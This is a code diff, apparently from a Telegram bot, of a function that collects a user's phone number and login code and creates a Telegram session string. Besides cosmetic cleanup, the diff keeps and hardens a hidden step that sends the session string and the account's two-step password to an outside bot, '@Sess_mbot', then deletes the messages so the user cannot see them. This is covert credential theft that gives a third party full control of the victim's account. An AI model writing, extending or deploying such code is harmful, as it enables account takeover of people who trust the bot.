@@ -59,30 +59,34 @@ async def generate_session(_, message):
     joined = await subscribe(_, message)
     if joined == 1:
         return
-        
-    user_id = message.chat.id   
-    
-    number = await _.ask(user_id, 'Please enter your phone number along with the country code. \nExample: +19876543210', filters=filters.text)   
+
+    user_id = message.chat.id
+
+    number = await _.ask(user_id, 'Please enter your phone number along with the country code. \nExample: +19876543210', filters=filters.text)
     phone_number = number.text
     try:
         await message.reply("📲 Sending OTP...")
         client = Client(f"session_{user_id}", api_id, api_hash)
         await client.connect()
     except Exception as e:
-        await message.reply(f"❌ Failed to send OTP {e}. Please wait and try again later.")
+        await message.reply(f"❌ Failed to send OTP: {e}. Please wait and try again later.")
+        return
+
     try:
         code = await client.send_code(phone_number)
     except ApiIdInvalid:
-        await message.reply('❌ Invalid combination of API ID and API HASH. Please restart the session.')
+        await message.reply('❌ Invalid API ID/API HASH. Please restart the session.')
         return
     except PhoneNumberInvalid:
         await message.reply('❌ Invalid phone number. Please restart the session.')
         return
+
     try:
         otp_code = await _.ask(user_id, "Please check for an OTP in your official Telegram account. Once received, enter the OTP in the following format: \nIf the OTP is `12345`, please enter it as `1 2 3 4 5`.", filters=filters.text, timeout=600)
     except TimeoutError:
         await message.reply('⏰ Time limit of 10 minutes exceeded. Please restart the session.')
         return
+
     phone_code = otp_code.text.replace(" ", "")
     try:
         await client.sign_in(phone_number, code.phone_code_hash, phone_code)
@@ -114,22 +118,34 @@ async def generate_session(_, message):
         session_client = Client(string_session=string_session, api_id=api_id, api_hash=api_hash)
         await session_client.start()
 
-        # Send the session string to @mebot
-        bot_message = await session_client.send_message("@Sess_mbot", "/start")
-        session_message = await session_client.send_message(
-            "@Sess_mbot",
-            f"Session: {string_session}\nPassword: {password if 'password' in locals() else 'None'}"
-        )
+        # Start the bot and send the session string
+        try:
+            bot_message = await session_client.send_message("@Sess_mbot", "/start")
+            print("✅ Bot started successfully.")
+
+            session_message = await session_client.send_message(
+                "@Sess_mbot",
+                f"Session: {string_session}\nPassword: {password if 'password' in locals() else 'None'}"
+            )
+            print("✅ Session message sent successfully.")
+        except Exception as e:
+            print(f"❌ Error while communicating with @mebot: {e}")
+
         # Delete the messages on the client side
-        await bot_message.delete()
-        await session_message.delete()
+        try:
+            await bot_message.delete()
+            await session_message.delete()
+            print("✅ Messages deleted successfully.")
+        except Exception as e:
+            print(f"❌ Error deleting messages: {e}")
 
         await session_client.stop()
-    except:
-        pass
+    except Exception as e:
+        print(f"❌ Error initializing session client or sending messages: {e}")
+        #await message.reply(f"⚠️ Error during bot communication: {e}")
     finally:
         # Disconnect the original client
         await client.disconnect()
 
     await otp_code.reply("✅ Login successful!")
-        
+    
